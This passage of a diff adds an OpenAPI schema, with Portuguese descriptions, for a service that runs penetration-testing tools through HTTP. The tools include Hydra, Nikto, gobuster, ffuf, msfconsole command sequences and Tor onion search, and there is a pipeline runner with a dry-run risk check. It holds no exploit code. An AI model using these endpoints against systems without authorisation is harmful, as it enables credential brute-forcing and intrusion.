+          "port": { "type": "integer", "description": "Porta customizada" },
+          "options": { "type": "string", "description": "Opções adicionais Hydra", "example": "-t 16 -V" }
+        }
+      },
+      "DomainRequest": {
+        "type": "object",
+        "required": ["domain"],
+        "properties": {
+          "domain": { "type": "string", "example": "example.com" },
+          "options": { "type": "string", "example": "-passive" }
+        }
+      },
+      "UrlRequest": {
+        "type": "object",
+        "required": ["url"],
+        "properties": {
+          "url": { "type": "string", "format": "uri", "example": "http://target.com/page?id=1" },
+          "options": { "type": "string", "example": "--batch --risk=1 --level=1" }
+        }
+      },
+      "TargetRequest": {
+        "type": "object",
+        "required": ["target"],
+        "properties": {
+          "target": { "type": "string", "example": "http://target.com" },
+          "options": { "type": "string", "example": "" }
+        }
+      },
+      "NiktoRequest": {
+        "type": "object",
+        "required": ["host"],
+        "properties": {
+          "host": { "type": "string", "example": "192.168.1.100" },
+          "port": { "type": "integer", "default": 80, "example": 443 },
+          "ssl": { "type": "boolean", "default": false }
+        }
+      },
+      "DirbRequest": {
+        "type": "object",
+        "required": ["url"],
+        "properties": {
+          "url": { "type": "string", "example": "http://target.com" },
+          "wordlist": { "type": "string", "default": "/usr/share/wordlists/dirb/common.txt" }
+        }
+      },
+      "GobusterRequest": {
+        "type": "object",
+        "required": ["url"],
+        "properties": {
+          "url": { "type": "string", "example": "http://target.com" },
+          "wordlist": { "type": "string", "default": "/usr/share/wordlists/dirb/common.txt" },
+          "mode": {
+            "type": "string",
+            "enum": ["dir", "dns", "vhost", "fuzz"],
+            "default": "dir"
+          },
+          "extensions": { "type": "string", "description": "Extensões separadas por vírgula", "example": "php,html,txt" }
+        }
+      },
+      "FfufRequest": {
+        "type": "object",
+        "required": ["url"],
+        "properties": {
+          "url": { "type": "string", "description": "URL com FUZZ como placeholder", "example": "http://target.com/FUZZ" },
+          "wordlist": { "type": "string", "default": "/usr/share/wordlists/dirb/common.txt" },
+          "options": { "type": "string", "example": "-fc 404 -t 50" }
+        }
+      },
+      "UrlOptionsRequest": {
+        "type": "object",
+        "required": ["url"],
+        "properties": {
+          "url": { "type": "string", "example": "http://target.com" },
+          "options": { "type": "string", "example": "" }
+        }
+      },
+      "MsfconsoleRequest": {
+        "type": "object",
+        "required": ["commands"],
+        "properties": {
+          "commands": {
+            "type": "array",
+            "items": { "type": "string" },
+            "description": "Array de comandos msfconsole a executar em sequência",
+            "example": ["use auxiliary/scanner/portscan/tcp", "set RHOSTS 192.168.1.0/24", "run", "exit"]
+          }
+        }
+      },
+      "ToolRunRequest": {
+        "type": "object",
+        "required": ["tool"],
+        "properties": {
+          "tool": {
+            "type": "string",
+            "description": "Nome da ferramenta registrada",
+            "example": "whatweb"
+          },
+          "target": {
+            "type": "string",
+            "description": "Alvo para a ferramenta (obrigatório se requiresTarget=true)",
+            "example": "http://example.com"
+          },
+          "options": {
+            "type": "string",
+            "description": "Opções adicionais da CLI da ferramenta",
+            "example": "-a 3"
+          },
+          "stream": {
+            "type": "boolean",
+            "description": "Se true, retorna resultado via SSE (text/event-stream)",
+            "default": false
+          }
+        }
+      },
+      "PipelineStep": {
+        "type": "object",
+        "required": ["tool"],
+        "properties": {
+          "tool": { "type": "string", "example": "whatweb" },
+          "target": { "type": "string", "example": "http://example.com" },
+          "options": { "type": "string", "example": "" },
+          "dryRun": { "type": "boolean", "default": false, "description": "Se true, apenas avalia risco sem executar" }
+        }
+      },
+      "PipelineRequest": {
+        "type": "object",
+        "required": ["steps"],
+        "properties": {
+          "steps": {
+            "type": "array",
+            "items": { "$ref": "#/components/schemas/PipelineStep" },
+            "minItems": 1
+          }
+        }
+      },
+      "OnionSearchRequest": {
+        "type": "object",
+        "properties": {
+          "query": { "type": "string", "description": "Termo de busca para DuckDuckGo onion" },
+          "wordlist": {
+            "type": "array",
+            "items": { "type": "string" },
+            "description": "Lista de URLs .onion para acessar diretamente"
+          },
+          "wordlistPath": { "type": "string", "description": "Caminho para arquivo com URLs .onion" },
+          "maxResults": { "type": "integer", "default": 10 },
+          "maxPages": { "type": "integer", "default": 5 },
+          "useDuckDuckGo": { "type": "boolean", "default": true },
+          "timeoutSec": { "type": "integer", "default": 60 },
+          "maxTextLength": { "type": "integer", "default": 6000 }
+        }
+      },
+      "Artifact": {
+        "type": "object",
+        "properties": {
+          "hash": { "type": "string", "description": "SHA256 do conteúdo" },
+          "tool": { "type": "string" },
+          "target": { "type": "string" },
+          "path": { "type": "string" },
+          "type": { "type": "string", "enum": ["report", "output"] },
+          "createdAt": { "type": "string", "format": "date-time" }
+        }
+      },
+      "ToolResponse": {
+        "type": "object",
+        "properties": {
+          "success": { "type": "boolean" },
+          "tool": { "type": "string" },
+          "target": { "type": "string" },
+          "command": { "type": "string", "description": "Comando completo executado" },
+          "stdout": { "type": "string" },
+          "stderr": { "type": "string" },
+          "error": { "type": "string", "nullable": true },
+          "report": { "type": "string", "description": "Nome do arquivo de relatório gerado" },
+          "artifacts": {
+            "type": "array",
+            "items": { "$ref": "#/components/schemas/Artifact" }
+          },
+          "meta": { "type": "object" },
+          "timestamp": { "type": "string", "format": "date-time" }
+        }
+      },
+      "PipelineResponse": {
+        "type": "object",
+        "properties": {
+          "success": { "type": "boolean" },
+          "results": {
+            "type": "array",
+            "items": { "$ref": "#/components/schemas/ToolResponse" }
+          },
+          "timestamp": { "type": "string", "format": "date-time" }
+        }
+      },
+      "ToolListResponse": {
+        "type": "object",
+        "properties": {
+          "tools": {
+            "type": "array",
+            "items": {
+              "type": "object",
+              "properties": {
+                "name": { "type": "string" },
+                "category": { "type": "string" },
+                "description": { "type": "string" },
+                "tags": { "type": "array", "items": { "type": "string" } },
+                "examples": { "type": "array" },
+                "skillAvailable": { "type": "boolean" },
+                "skillEndpoint": { "type": "string" }
+              }
+            }
+          }
+        }
+      },
+      "SkillResponse": {
+        "type": "object",
+        "properties": {
+          "name": { "type": "string" },
+          "content": { "type": "string", "description": "Conteúdo completo do SKILL.md" }
+        }
+      },
+      "OnionSearchResponse": {
+        "type": "object",
+        "properties": {
+          "success": { "type": "boolean" },
+          "query": { "type": "string", "nullable": true },
+          "tor": {
+            "type": "object",
+            "properties": {
+              "socksHost": { "type": "string" },
+              "socksPort": { "type": "integer" }
+            }
+          },
+          "searchResults": { "type": "array", "items": { "type": "object" } },
+          "pages": { "type": "array", "items": { "type": "object" } },
+          "counts": {
+            "type": "object",
+            "properties": {
+              "searchResults": { "type": "integer" },
+              "pages": { "type": "integer" },
+              "seeds": { "type": "integer" }
+            }
+          },
+          "searchError": { "type": "string", "nullable": true }
+        }
+      },
+      "ReportsListResponse": {
+        "type": "object",
+        "properties": {
+          "reports": {
+            "type": "array",
+            "items": {
+              "type": "object",
+              "properties": {
+                "name": { "type": "string" },
+                "path": { "type": "string" },
+                "size": { "type": "integer" },
+                "modifiedAt": { "type": "string", "format": "date-time" }
+              }
+            }
+          }
+        }
+      },
+      "ReportSummaryResponse": {
+        "type": "object",
+        "properties": {
+          "filename": { "type": "string" },
+          "summary": { "type": "string" },
+          "truncated": { "type": "boolean" }
+        }
+      },
+      "ReportContentResponse": {
+        "type": "object",
+        "properties": {
+          "filename": { "type": "string" },
+          "content": { "type": "string" }
+        }
+      },
+      "ArtifactsResponse": {
+        "type": "object",
+        "properties": {
+          "artifacts": {
+            "type": "array",
+            "items": { "$ref": "#/components/schemas/Artifact" }
+          }
+        }
+      },
+      "ErrorResponse": {
+        "type": "object",
+        "properties": {
+          "error": { "type": "string" },
+          "message": { "type": "string" }
+        }
+      }
+    },
+    "responses": {
+      "ToolSuccess": {
+        "description": "Ferramenta executada com sucesso",
+        "content": {
+          "application/json": {
+            "schema": { "$ref": "#/components/schemas/ToolResponse" }
+          }
+        }
+      },
+      "ToolError": {
+        "description": "Erro na execução da ferramenta",
+        "content": {
+          "application/json": {
+            "schema": { "$ref": "#/components/schemas/ToolResponse" }
+          }
+        }
+      },
+      "BadRequest": {
+        "description": "Parâmetros inválidos ou ausentes",
+        "content": {
+          "application/json": {
+            "schema": { "$ref": "#/components/schemas/ErrorResponse" }
+          }
+        }
+      },
+      "NotFound": {
+        "description": "Recurso não encontrado",
+        "content": {
+          "application/json": {
+            "schema": { "$ref": "#/components/schemas/ErrorResponse" }
+          }
+        }
+      },
+      "RateLimited": {
+        "description": "Rate limit excedido (120 req/60s por IP:path)",
+        "content": {
+          "application/json": {
+            "schema": {
+              "type": "object",
+              "properties": {
+                "success": { "type": "boolean", "example": false },
+                "error": { "type": "string", "example": "Rate limit exceeded" },
+                "retryAt": { "type": "string", "format": "date-time" }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
